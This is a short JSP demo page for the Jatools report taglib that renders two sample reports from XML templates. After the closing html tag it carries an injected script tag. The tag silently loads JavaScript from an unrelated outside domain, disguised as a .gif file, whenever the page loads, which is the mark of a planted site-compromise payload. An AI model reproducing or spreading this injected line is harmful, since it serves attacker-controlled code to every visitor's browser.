<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>
<script>


</script>
第一张报表
<jatools:report id="_report1" template="../webapps/jrs/example/sub.xml" border="border:1px solid blue" offset="4" />

<div style='clear:both;'/>
第二张报表 
<jatools:report id="_report2" template="../webapps/jrs/example/master.xml" border="border:1px solid red" offset="4" />


</body>
</html>

<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
